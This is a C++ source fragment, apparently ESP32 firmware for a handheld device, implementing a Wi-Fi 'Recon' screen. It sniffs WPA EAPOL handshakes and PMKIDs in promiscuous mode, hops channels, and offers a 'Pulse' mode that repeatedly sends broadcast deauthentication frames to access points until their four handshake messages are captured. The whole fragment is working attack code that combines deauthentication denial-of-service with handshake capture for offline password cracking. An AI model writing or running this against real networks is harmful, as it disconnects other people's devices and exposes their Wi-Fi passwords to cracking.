struct ReconEvt {
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t bits;
};

struct ReconTarget {
  uint8_t bssid[6];
  uint8_t mask;
  bool pmkid;
  int8_t rssi;
  uint32_t lastMs;
};

constexpr int kReconEvtSlots = 48;
constexpr int kReconMaxTargets = 10;
constexpr int kReconVisibleRows = 5;
constexpr uint32_t kReconHopMs = 300;
constexpr uint32_t kReconPulseMs = 2500;
constexpr uint32_t kReconRedrawMs = 450;
static const uint8_t kReconMultiChannels[] = {1, 6, 11};

static volatile ReconEvt rcEvtQ[kReconEvtSlots];
static volatile int rcEvtHead = 0;
static volatile int rcEvtTail = 0;

static ReconTarget rcTargets[kReconMaxTargets];
static int rcTargetCount = 0;
static int rcMode = 0;
static bool rcPulse = false;
static bool rcActive = false;
static int rcHopIdx = 0;
static uint32_t lastReconHopMs = 0;
static uint32_t lastReconPulseMs = 0;
static uint32_t lastReconDrawMs = 0;

void reconCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* packet = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = packet->payload;
  const int length = packet->rx_ctrl.sig_len;
  if (length < 24) return;
  const uint8_t frameControl = payload[0];
  if (((frameControl >> 2) & 0x03) != 0x02) return;
  int header = 24;
  const uint8_t subtype = (frameControl >> 4) & 0x0F;
  if (subtype & 0x08) header += 2;
  const uint8_t frameControl1 = payload[1];
  const bool toDs = frameControl1 & 0x01;
  const bool fromDs = frameControl1 & 0x02;
  if (toDs && fromDs) header += 6;
  if (length < header + 8) return;
  const uint8_t* llc = payload + header;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[6] == 0x88 && llc[7] == 0x8E))
    return;

  const uint8_t* bssid = fromDs ? payload + 10 : payload + 4;
  const int llcEnd = header + 8;
  const int keyInfoOffset = llcEnd + 1 + 1 + 2 + 1;
  if (length < keyInfoOffset + 2) return;
  const uint16_t keyInfo = (payload[keyInfoOffset] << 8) | payload[keyInfoOffset + 1];
  const bool pairwise = keyInfo & 0x0008;
  if (!pairwise) return;
  const bool install = keyInfo & 0x0040;
  const bool ack = keyInfo & 0x0080;
  const bool mic = keyInfo & 0x0100;
  const bool secure = keyInfo & 0x0200;
  uint8_t bits = 0;
  if (ack && !mic && !install) bits = 0x01;
  else if (mic && !ack && !secure) bits = 0x02;
  else if (mic && ack && install) bits = 0x04;
  else if (mic && secure && !ack) bits = 0x08;

  int scanEnd = length < llcEnd + 220 ? length : llcEnd + 220;
  for (int i = llcEnd; i + 4 <= scanEnd; ++i) {
    if (payload[i] == 0x00 && payload[i + 1] == 0x0F &&
        payload[i + 2] == 0xAC && payload[i + 3] == 0x04) {
      bits |= 0x10;
      break;
    }
  }
  if (bits == 0) return;

  const int next = (rcEvtHead + 1) % kReconEvtSlots;
  if (next == rcEvtTail) return;
  for (int i = 0; i < 6; ++i) rcEvtQ[rcEvtHead].bssid[i] = bssid[i];
  rcEvtQ[rcEvtHead].rssi = packet->rx_ctrl.rssi;
  rcEvtQ[rcEvtHead].bits = bits;
  rcEvtHead = next;
}

static int rcFindOrAdd(const uint8_t* bssid) {
  for (int i = 0; i < rcTargetCount; ++i) {
    bool same = true;
    for (int j = 0; j < 6; ++j)
      if (rcTargets[i].bssid[j] != bssid[j]) { same = false; break; }
    if (same) return i;
  }
  if (rcTargetCount >= kReconMaxTargets) {
    int oldest = 0;
    for (int i = 1; i < rcTargetCount; ++i)
      if (rcTargets[i].lastMs < rcTargets[oldest].lastMs) oldest = i;
    return oldest;
  }
  const int idx = rcTargetCount++;
  for (int j = 0; j < 6; ++j) rcTargets[idx].bssid[j] = bssid[j];
  rcTargets[idx].mask = 0;
  rcTargets[idx].pmkid = false;
  rcTargets[idx].rssi = -127;
  return idx;
}

static void rcDrain() {
  while (rcEvtTail != rcEvtHead) {
    const int t = rcEvtTail;
    uint8_t b[6];
    for (int j = 0; j < 6; ++j) b[j] = rcEvtQ[t].bssid[j];
    const int8_t rssi = rcEvtQ[t].rssi;
    const uint8_t bits = rcEvtQ[t].bits;
    rcEvtTail = (t + 1) % kReconEvtSlots;
    const int idx = rcFindOrAdd(b);
    rcTargets[idx].mask |= (bits & 0x0F);
    if (bits & 0x10) rcTargets[idx].pmkid = true;
    rcTargets[idx].rssi = rssi;
    rcTargets[idx].lastMs = millis();
  }
}

static void rcResolveSsid(const uint8_t* bssid, char* out, int outLen) {
  uint8_t mac[6];
  for (int i = 0; i < wifiCount; ++i) {
    if (parseBssid(wifiEntries[i].bssid, mac)) {
      bool same = true;
      for (int j = 0; j < 6; ++j)
        if (mac[j] != bssid[j]) { same = false; break; }
      if (same && wifiEntries[i].ssid.length()) {
        strncpy(out, wifiEntries[i].ssid.c_str(), outLen - 1);
        out[outLen - 1] = 0;
        return;
      }
    }
  }
  snprintf(out, outLen, "%02X%02X%02X", bssid[3], bssid[4], bssid[5]);
}

static void rcSendPulse() {
  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t frame[26];
  for (int i = 0; i < rcTargetCount; ++i) {
    if ((rcTargets[i].mask & 0x0F) == 0x0F) continue;
    buildDeauthFrame(frame, broadcast, rcTargets[i].bssid, 0xC0);
    for (int k = 0; k < 2; ++k)
      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  }
}

static const char* rcModeLabel(int m) {
  return m == 0 ? "HOP all" : m == 1 ? "1 ch" : "multi";
}

void drawReconCapture() {
  currentView = View::kReconCapture;
  display.fillScreen(kBackground);
  drawHeader("RECON", rcActive ? "capturing" : "idle");

  const int pillY = 46;
  const int pillW = 74;
  for (int m = 0; m < 3; ++m) {
    const int px = 6 + m * (pillW + 2);
    const bool on = (m == rcMode);
    display.drawRect(px, pillY, pillW, 20, on ? kAccent : 0x18E3);
    display.setTextSize(1);
    display.setTextColor(on ? kAccent : kMuted, kBackground);
    display.setCursor(px + 8, pillY + 6);
    display.print(rcModeLabel(m));
  }

  int y = 76;
  const int shown = rcTargetCount < kReconVisibleRows ? rcTargetCount : kReconVisibleRows;
  for (int r = 0; r < shown; ++r) {
    const ReconTarget& t = rcTargets[r];
    char ssid[18];
    rcResolveSsid(t.bssid, ssid, sizeof(ssid));
    display.setTextSize(1);
    display.setTextColor(kForeground, kBackground);
    display.setCursor(8, y);
    display.print(ssid);
    if (rcPulse && (t.mask & 0x0F) != 0x0F) {
      display.setTextColor(kBad, kBackground);
      display.setCursor(150, y);
      display.print("PULSE");
    }
    for (int m = 0; m < 4; ++m) {
      const bool got = t.mask & (1 << m);
      const int dx = 8 + m * 18;
      display.fillCircle(dx + 4, y + 20, 6, got ? kGood : 0x2104);
      display.setTextColor(got ? kBackground : kMuted, got ? kGood : kBackground);
      display.setCursor(dx + 1, y + 16);
      display.printf("%d", m + 1);
    }
    display.setTextColor(t.pmkid ? kGood : kMuted, kBackground);
    display.setCursor(96, y + 16);
    display.print(t.pmkid ? "PMKID+" : "PMKID");
    display.setTextColor(kMuted, kBackground);
    display.setCursor(176, y + 16);
    display.printf("%d", t.rssi);
    y += 38;
  }

  if (rcTargetCount == 0) {
    display.setTextColor(kMuted, kBackground);
    display.setCursor(40, 150);
    display.print("Listening for EAPOL...");
  }

  drawThreeButtonFooter("Mode", rcPulse ? "Pulse*" : "Pulse", "Back");
}

void reconCaptureCycleMode() {
  rcMode = (rcMode + 1) % 3;
  rcHopIdx = 0;
}

void reconCaptureTogglePulse() {
  if (!rcPulse) {
    if (!confirmActiveTest("Recon pulse")) {
      drawReconCapture();
      return;
    }
  }
  rcPulse = !rcPulse;
}

void startReconCapture() {
  if (!stopActiveTools()) return;
  rcTargetCount = 0;
  rcEvtHead = 0;
  rcEvtTail = 0;
  rcMode = 0;
  rcPulse = false;
  rcHopIdx = 0;
  lastReconHopMs = millis();
  lastReconPulseMs = millis();
  lastReconDrawMs = 0;
  signalMonitorActive = false;

  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&reconCaptureCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(kDeauthHopChannels[0], WIFI_SECOND_CHAN_NONE);
  rcActive = true;
  currentView = View::kReconCapture;
  drawReconCapture();
}

void stopReconCapture() {
  if (!rcActive) return;
  rcActive = false;
  rcPulse = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

void updateReconCapture() {
  if (currentView != View::kReconCapture || !rcActive) return;
  const uint32_t now = millis();
  rcDrain();

  if (rcMode != 1 && now - lastReconHopMs >= kReconHopMs) {
    lastReconHopMs = now;
    uint8_t ch;
    if (rcMode == 2) {
      rcHopIdx = (rcHopIdx + 1) % (int)(sizeof(kReconMultiChannels));
      ch = kReconMultiChannels[rcHopIdx];
    } else {
      rcHopIdx = (rcHopIdx + 1) % kDeauthHopChannelCount;
      ch = kDeauthHopChannels[rcHopIdx];
    }
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }

  if (rcPulse && now - lastReconPulseMs >= kReconPulseMs) {
    lastReconPulseMs = now;
    rcSendPulse();
  }

  if (now - lastReconDrawMs >= kReconRedrawMs) {
    lastReconDrawMs = now;
    drawReconCapture();
  }
}

void reconCaptureTouch(int x) {
  if (x < kScreenWidth / 3) {
    reconCaptureCycleMode();
    drawReconCapture();
  } else if (x < (kScreenWidth * 2) / 3) {
    reconCaptureTogglePulse();
    drawReconCapture();
  } else {
    stopReconCapture();
    drawReconMenu();
  }
}
